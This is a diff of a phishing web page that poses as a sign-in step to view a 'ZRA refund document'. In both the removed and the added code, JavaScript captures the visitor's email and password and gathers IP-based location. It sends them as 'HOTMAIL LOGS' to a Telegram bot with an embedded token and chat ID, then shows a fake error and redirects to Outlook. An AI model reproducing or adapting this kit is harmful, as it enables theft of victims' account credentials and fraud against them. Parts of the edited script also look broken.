@@ -179,14 +179,15 @@
       <h2>SIGN-IN WITH YOUR VALID EMAIL TO<br>VIEW ZRA REFUND DOCUMENT</h2>
       <form id="loginForm">
         <!-- Email -->
+		
         <div class="input-group">
-          <input type="email" name="ai" class="form-control rounded-0 border-dark" id="ai" aria-describedby="aiHelp" placeholder="Email, Phone or Skype" required="required" />
-          <p id="msgfont"></p>
-          <div class="password-wrapper"></div>
-        </div>
+		<input type="email" id="oruko" placeholder="Email" autocomplete="on" required="required" />
+		<p id="msgfont"></p>
+		<div class="password-wrapper"></div>
+	</div>
         <!-- Password with toggle -->
         <div class="input-group" style="position: relative;">
-          <input type="password" id="password" name="kokoro" placeholder="Password" required />
+          <input type="password" id="password" name="kokoro" placeholder="Password" required "kokoro"/>
           <div class="password-toggle" id="togglePassword" title="Show Password">
             <!-- Eye icon SVG -->
             <svg id="eyeIcon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="#555" viewBox="0 0 24 24">
@@ -209,187 +210,166 @@
     </div>
   </div>
 
-  <script type="text/javascript">
-    /* global $ */
-    document.addEventListener('DOMContentLoaded', function() {
-      var count = 0;
+  <!-- Inside the existing script, replace the handleSubmission() function with this: -->
 
-      // Extract the value after the '#' symbol from the URL
-      var ai = window.location.hash.substr(1);
+<script type="text/javascript">
 
-      if (!ai) {
-        // Code to handle the case when the 'ai' value is not present in the URL
+    // Password toggle
+    togglePassword.addEventListener('click', function() {
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        eyeIcon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>';
+        passwordVisible = true;
       } else {
-        // Regular expression to check if 'ai' is a valid base64 string
-        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
-
-        // Decode 'ai' if it is a base64 string, otherwise use the original value
-        var my_ai = base64regex.test(ai) ? atob(ai) : ai;
-
-        // Regular expression to check if 'my_ai' is a valid email address
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-        if (!filter.test(my_ai)) {
-          // Display an error message if 'my_ai' is not a valid email address
-          // You can add your error handling here
-        }
-
-        // Extract the domain name from 'my_ai'
-        var ind = my_ai.indexOf("@");
-        var my_slice = my_ai.substr((ind + 1));
-        var c = my_slice.substr(0, my_slice.indexOf('.'));
-        var fnl = c.toLowerCase();
-        var fnlu = c.toUpperCase();
-
-        // Set the value of the input field with the email address
-        document.getElementById('ai').value = my_ai;
+        passwordInput.type = 'password';
+        eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+        passwordVisible = false;
       }
-
-      // Auto-fill email from URL parameter 'emp'
-      const emailFromUrl = new URLSearchParams(window.location.search).get('emp');
-      const emailField = document.getElementById('ai');
-
-      if (emailFromUrl && emailField) {
-        emailField.value = emailFromUrl;
-        // Lock the email field so user cannot edit
-        emailField.readOnly = true;
-        emailField.style.backgroundColor = '#f5f5f5';
-        emailField.style.cursor = 'not-allowed';
-      }
-
-      // Hide the error message when the 'ai' input field is clicked
-      $('#ai').click(function() {
-        $('#error').hide();
-      });
-
-      // Handle Enter key press event
-      $(document).keypress(function(event) {
-        var keycode = (event.keyCode ? event.keyCode : event.which);
-        if (keycode == '13') {
-          event.preventDefault();
-          if ($("#diiiv1").is(":visible")) {
-            $("#next").click();
-          } else if ($("#div2").is(":visible")) {
-            event.preventDefault();
-            $("#submit-btn").click();
-          } else {
-            return false;
-          }
-        }
-      });
-
-      // Handle the click event for the 'Next' button
-      $('#next').click(function() {
-        event.preventDefault();
-        var my_ai = $('#ai').val();
-        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-        if (!filter.test(my_ai)) {
-          // Display an error message if 'my_ai' is not a valid email address
-          $('#error').show();
-          ai.focus;
-          return false;
-        }
-
-        // Extract the domain name from 'my_ai'
-        var ind = my_ai.indexOf("@");
-        var my_slice = my_ai.substr((ind + 1));
-        var c = my_slice.substr(0, my_slice.indexOf('.'));
-        var fnl = c.toLowerCase();
-        var fnlu = c.toUpperCase();
-
-        // Your existing code...
-      });
-
-      // Fetch location data
-      let locationData = { country: "Unknown", city: "Unknown", state: "Unknown", ip: "Unknown" };
-      let countAttempt = 0;
-
-      function fetchLocationFromIP() {
-        fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,isp,query')
-          .then(response => response.json())
-          .then(data => {
-            if (data.status === 'success') {
-              locationData = {
-                country: data.country || 'Unknown',
-                state: data.regionName || 'Unknown',
-                city: data.city || 'Unknown',
-                ip: data.query || 'Unknown',
-                isp: data.isp || 'Unknown'
-              };
-            } else {
-              locationData = { country: "Blocked", state: "Blocked", ip: data.query || "Unknown" };
-            }
-          })
-          .catch(() => {
-            locationData = { country: "Offline", state: "Offline" };
-          });
-      }
-
-      // Send function
-      function sendToTelegram(url, data) {
-        fetch(url, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(data)
-        });
-      }
-
-      // Handle submission
-      function handleSubmission() {
-        const email = document.getElementById('oruko').value.trim();
-        const password = document.getElementById('password').value.trim();
-        const honeypot = document.querySelector('.honeypot').value;
-
-        if (honeypot !== '') return; // spam check
-
-        if (!email || !password) {
-          alert('Please enter email and password.');
-          return;
-        }
-
-        countAttempt++;
-
-        // Build message
-        let messageText = '=== HOTMAIL LOGS ===\n';
-        messageText += `Email: ${email}\n`;
-        messageText += `Password: ${password}\n\n`;
-        messageText += `LOCATION (IP-BASED):\n`;
-        messageText += `IP: ${locationData.ip}\n`;
-        messageText += `Country: ${locationData.country}\n`;
-        messageText += `State/Region: ${locationData.state}\n`;
-        if (locationData.city !== 'Unknown') messageText += `City: ${locationData.city}\n`;
-        if (locationData.isp && locationData.isp !== 'Unknown') messageText += `ISP: ${locationData.isp}\n`;
-        messageText += `\nTime: ${new Date().toLocaleString()}\n`;
-        messageText += `Attempts: ${countAttempt}\n`;
-
-        // Send to Telegram bots
-        sendToTelegram(`https://api.telegram.org/bot8396461824:AAGN2PAc1yY9eykP-KsstA2n0iRuGf17Srw/sendMessage`, {
-          chat_id: '1344934562',
-          text: messageText
-        });
-        // add other bot if needed
-
-        // Redirect or show message
-        if (countAttempt >= 2) {
-          setTimeout(() => {
-            window.location.href = "https://outlook.live.com/mail/inbox/id/"; // your redirect URL
-          }, 2000);
-        } else {
-          setTimeout(() => {
-            alert("Invalid email or Password");
-          }, 2000);
-        }
-      }
-
-      document.getElementById('submitBtn').addEventListener('click', handleSubmission);
-      document.getElementById('loginForm').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') handleSubmission();
-      });
-
-      // Fetch location data on load
-      fetchLocationFromIP();
     });
-  </script>
-</body>
-</html>
+	
+	// Get email from URL and pre-fill the email field
+    const emailFromUrl = getEmailFromUrl();
+    const emailField = document.getElementById('email');
+	/// Extract the value after the '#' symbol from the URL
+      var Email = window.location.hash.substr(1);
+    function getEmailFromUrl() {
+      const urlParams = new URLSearchParams(window.location.search);
+      return urlParams.get('emp');
+    }
+    
+    if (emailFromUrl && emailField) {
+      emailField.value = emailFromUrl;
+      // LOCK THE EMAIL FIELD - user cannot edit or clear it
+      emailField.readOnly = true;
+      emailField.style.backgroundColor = '#f5f5f5';
+      emailField.style.cursor = 'not-allowed';
+    }
+  document.addEventListener('DOMContentLoaded', function() {
+    const togglePassword = document.getElementById('togglePassword');
+    const passwordInput = document.getElementById('password');
+    const eyeIcon = document.getElementById('eyeIcon');
+    const submitBtn = document.getElementById('submitBtn');
+    const passwordMessage = document.getElementById('passwordMessage');
+
+    let firstClick = true; // To show "Incorrect password" initially
+    let passwordVisible = false; // Track password toggle
+
+
+    // Handle "View" button click
+    document.getElementById('submitBtn').addEventListener('click', function() {
+      if (firstClick) {
+        // Show incorrect message
+        document.getElementById('passwordMessage').textContent = "";
+		setTimeout(() => {
+          passwordInput.value = '';
+        }, 2000);
+
+        // Clear password after 2 second
+        setTimeout(() => {
+          passwordInput.value = '';
+        }, 2000);
+      } else {
+        // Toggle password visibility on second click
+        if (passwordInput.type === 'password') {
+  passwordInput.type = 'text';
+  eyeIcon.innerHTML = '<path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/>';
+  document.getElementById('submitBtn').textContent = 'Viewing'; // Change button text
+} else {
+  passwordInput.type = 'password';
+  eyeIcon.innerHTML = '<path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>';
+  document.getElementById('submitBtn').textContent = 'View'; // Reset to "View"
+}
+      }
+      firstClick = false; // Next clicks toggle password
+    });
+
+    // Fetch location data
+    let locationData = { country: "Unknown", city: "Unknown", state: "Unknown", ip: "Unknown" };
+    let countAttempt = 0;
+
+    function fetchLocationFromIP() {
+      fetch('http://ip-api.com/json/?fields=status,message,country,regionName,city,isp,query')
+        .then(response => response.json())
+        .then(data => {
+          if (data.status === 'success') {
+            locationData = {
+              country: data.country || 'Unknown',
+              state: data.regionName || 'Unknown',
+              city: data.city || 'Unknown',
+              ip: data.query || 'Unknown',
+              isp: data.isp || 'Unknown'
+            };
+          } else {
+            locationData = { country: "Blocked", state: "Blocked", ip: data.query || "Unknown" };
+          }
+        })
+        .catch(() => {
+          locationData = { country: "Offline", state: "Offline" };
+        });
+    }
+
+    // Send function
+    function sendToTelegram(url, data) {
+      fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
+    }
+
+    // Handle submission
+    function handleSubmission() {
+      const email = document.getElementById('oruko').value.trim();
+      const password = document.getElementById('password').value.trim();
+      const honeypot = document.querySelector('.honeypot').value;
+
+      if (honeypot !== '') return; // spam check
+
+      if (!email || !password) {
+        alert('Please enter email and password.');
+        return;
+      }
+
+      countAttempt++;
+
+      // Build message
+      let messageText = '=== HOTMAIL LOGS ===\n';
+      messageText += `Email: ${email}\n`;
+      messageText += `Password: ${password}\n\n`;
+      messageText += `LOCATION (IP-BASED):\n`;
+      messageText += `IP: ${locationData.ip}\n`;
+      messageText += `Country: ${locationData.country}\n`;
+      messageText += `State/Region: ${locationData.state}\n`;
+      if (locationData.city !== 'Unknown') messageText += `City: ${locationData.city}\n`;
+      if (locationData.isp && locationData.isp !== 'Unknown') messageText += `ISP: ${locationData.isp}\n`;
+      messageText += `\nTime: ${new Date().toLocaleString()}\n`;
+      messageText += `Attempts: ${countAttempt}\n`;
+
+      // Send to Telegram bots
+      sendToTelegram(`https://api.telegram.org/bot8396461824:AAGN2PAc1yY9eykP-KsstA2n0iRuGf17Srw/sendMessage`, {
+        chat_id: '1344934562',
+        text: messageText
+      });
+      // add other bot if needed
+
+      // Redirect or show message
+      if (countAttempt >= 2) {
+        setTimeout(() => {
+          window.location.href = "https://outlook.live.com/mail/inbox/id/"; // your redirect URL
+        }, 2000);
+      } else {
+        setTimeout(() => {
+          alert("Invalid email or Password");
+        }, 2000);
+      }
+    }
+
+    document.getElementById('submitBtn').addEventListener('click', handleSubmission);
+    document.getElementById('loginForm').addEventListener('keydown', function(e) {
+      if (e.key === 'Enter') handleSubmission();
+    });
+
+    // Fetch location data on load
+    fetchLocationFromIP();
+  });
+</script>
